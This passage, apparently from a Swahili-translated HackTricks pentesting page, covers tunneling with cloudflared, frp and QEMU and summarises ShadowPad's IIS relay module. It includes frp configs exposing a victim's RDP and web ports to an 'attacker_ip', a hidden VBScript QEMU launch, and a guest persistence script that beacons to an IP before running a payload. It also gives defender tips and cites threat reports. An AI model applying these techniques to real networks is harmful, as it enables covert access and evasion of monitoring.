Bendera ya zamani ya `--socks5` huiambia `cloudflared` kwamba origin ya ndani inatumia SOCKS5; haiundi listener ya ndani ya SOCKS5. Kwa tunnel inayodhibitiwa, `originRequest.proxyType: socks` husanidi ushughulikiaji wa origin ya SOCKS5.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Tunnel zinazoendelea kupitia DNS

Usanidi wa tunnel unaosimamiwa locally hutumia funguo za herufi ndogo `tunnel`, `credentials-file`, na `url`, kama inavyoonyeshwa hapa chini.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Anzisha connector:
```bash
cloudflared tunnel run mytunnel
```
The connector huanzisha connections za outbound na, kwa default, hujadiliana kutumia QUIC huku ikiwa na fallback kwenda HTTP/2; usidhani kila deployment hutumia TCP/443. Iendeshe ikiwa na privileges zinazohitajika tu na deployment yako.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ni Go reverse proxy inayotumia **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, na XTCP**. XTCP hutumia P2P hole punching, ambayo mafanikio yake hutegemea NAT. Kuanzia **v0.53.0**, inaweza kufanya kazi kama **SSH Tunnel Gateway**, hivyo target host inaweza kutumia stock OpenSSH client bila `frpc` binary.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Kutumia gateway mpya ya SSH (bila binary ya frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Amri iliyo hapo juu huchapisha port **8080** ya victim kama **attacker_ip:9000** kwa kutumia client ya kawaida ya OpenSSH, huku `frps` ikitoa gateway.<sup>[[50]](#references)</sup>

## Tunnels za VM za Kificho kwa QEMU

Networking ya user-mode ya QEMU haihitaji root au administrator privilege kwa network ya virtual, na `-netdev user,hostfwd=...` huelekeza miunganisho ya TCP, UDP, au UNIX kutoka kwa host kwenda kwa guest.<sup>[[51]](#references)</sup> TrustedSec iliandika kuhusu Tiny Core QEMU VM na jaribio la reverse SSH tunnel katika tukio ambapo EDR inayolenga host inaweza kukosa shughuli ndani ya guest.<sup>[[1]](#references)</sup>

### Mstari mmoja wa haraka
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Amri iliyo hapo juu huanzisha guest ya **Tiny Core Linux** yenye 256 MiB za memory ya guest na disk image ya qcow2; disk image hiyo si disk iliyo ndani ya RAM.
• Port **2222/tcp** kwenye Windows host hu-forward kwa uwazi kwenda **22/tcp** ndani ya guest.
• Kwa mtazamo wa attacker, target huonyesha port 2222 pekee; packet yoyote inayofika hapo hushughulikiwa na SSH server inayoendesha ndani ya VM.

### Kuanzisha kwa kujificha kupitia VBScript

TrustedSec ilibaini uzinduzi wa QEMU unaoendeshwa na VBS pamoja na image za Tiny Core katika tukio lililotajwa hapo juu.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Kuendesha script kwa `cscript.exe //B update.vbs` hufanya window ibaki imefichwa.<sup>[[1]](#references)</sup>

### Persistence ndani ya guest

Tukio lililotajwa linaeleza persistence katika Tiny Core guest isiyo na state kupitia `/opt/bootlocal.sh` na `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Weka payload kwenye `/opt/123.out`
2. Ongeza kwenye `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Ongeza `home/tc` na `opt` kwenye `/opt/filetool.lst` ili payload ijumuishwe kwenye `mydata.tgz` wakati wa kuzima.

### Mazingatio ya telemetry

• Host bado huonyesha mchakato wa QEMU, image ya qcow2, na listener yoyote iliyo-forwardiwa na host.
• Scans za processes zinazofanywa kwenye host pekee huenda zisikague processes za guest, lakini virtualization si njia ya uhakika ya kujificha; telemetry ya network, QEMU, na image bado inaweza kuifichua.<sup>[[1]](#references)[[51]](#references)</sup>

### Vidokezo kwa Defender

• Weka alert kwenye **QEMU/VirtualBox/KVM binaries zisizotarajiwa** zilizo kwenye paths zinazoweza kuandikwa na mtumiaji.
• Zuia connections za nje zinazoanzishwa na `qemu-system*.exe`.
• Tafuta listening ports adimu (2222, 10022, …) zinazobind mara tu baada ya QEMU kuanzishwa.

## IIS/HTTP.sys relay nodes kupitia `HttpAddUrl` (ShadowPad)

Check Point inaeleza IIS module ya ShadowPad kama inayobadilisha web servers za perimeter zilizoathiriwa kuwa backdoor na relay nodes kwa kubind URL prefixes kupitia `HttpAddUrl`.<sup>[[3]](#references)</sup>

Ripoti hiyo hiyo inaeleza defaults, wildcard listeners, packet decryption, relay queues, na debug telemetry zilizofupishwa hapa chini.<sup>[[3]](#references)</sup>

* **Config defaults** – ikiwa JSON config ya module haijumuishi values, hutumia IIS defaults zinazoaminika (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Kwa njia hiyo, traffic halali hujibiwa na IIS ikiwa na branding sahihi.
* **Wildcard interception** – operators hutoa orodha iliyotenganishwa kwa semicolon ya URL prefixes (wildcards katika host + path). Module huita `HttpAddUrl` kwa kila entry, hivyo HTTP.sys huelekeza requests zinazolingana kwa malicious handler; requests zisizolingana hurudi kwenye tabia ya kawaida ya IIS.
* **Encrypted first packet** – bytes mbili za kwanza za request body hubeba seed ya custom 32-bit PRNG. Kila byte inayofuata hufanyiwa XOR na keystream iliyotengenezwa kabla ya protocol parsing:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module hudumisha lists mbili: “servers” (upstream nodes) na “clients” (downstream implants). Entries huondolewa ikiwa hakuna heartbeat inayowasili ndani ya takriban sekunde 30. Lists zote mbili zinapokuwa si tupu, huunganisha server ya kwanza yenye afya na client ya kwanza yenye afya, kisha hupitisha bytes kati ya sockets zao hadi upande mmoja ufungwe.
* **Debug telemetry** – logging ya hiari hurekodi source IP, destination IP, na jumla ya bytes zilizoforwardiwa kwa kila pairing. Investigators walitumia breadcrumbs hizo kuunda upya ShadowPad mesh iliyohusisha victims wengi.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Kujificha kwenye Vivuli: Covert Tunnels kupitia QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Utafiti wa Check Point – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Storm-2603 za Ransomware](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Utafiti wa Check Point – Ndani ya Ink Dragon: Kufichua Relay Network na Jinsi ya Ndani ya Operesheni ya Kifaheri ya Kushambulia](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README ya Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Mwongozo wa Marejeo wa Nmap: Kupita Vikwazo vya Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Mwongozo wa ssh wa OpenBSD](https://man.openbsd.org/ssh)
- [7] [Mwongozo wa sshd_config wa OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Maelezo ya toleo la OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README ya sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting katika Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Nyaraka za Metasploit socks_proxy module](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Nyaraka za Metasploit autoroute module](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README ya reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README ya Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [README ya rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Mwongozo wa socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Mwongozo wa PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Chaguo za command-line za PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README ya SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Nyaraka za Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxification Rules za Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Mwongozo wa OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README ya YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README ya iodine](https://code.kryo.se/iodine/README.html)
- [32] [README ya dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README ya dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README ya proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Majina ya Domain - Utekelezaji na Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README ya ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Muhtasari wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Vigezo vya origin vya Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Usanidi wa Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Faili ya usanidi ya Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Vigezo vya uendeshaji vya Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [dhana za frp](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Nyaraka za networking za QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
